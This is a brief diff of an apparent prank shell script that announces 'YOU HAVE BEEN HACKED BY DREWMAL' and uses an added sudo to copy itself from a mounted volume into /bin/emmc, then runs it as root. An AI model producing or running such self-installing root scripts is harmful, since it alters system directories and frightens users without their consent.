@@ -10,5 +10,5 @@ sleep 3
 say YOU HAVE BEEN HACKED BY DREWMAL
 sleep 3
 say YOU HAVE BEEN HACKED BY DREWMAL
-cp /volumes/hacktop/main.sh /bin/emmc
+sudo cp /volumes/hacktop/main.sh /bin/emmc
 sudo emmc
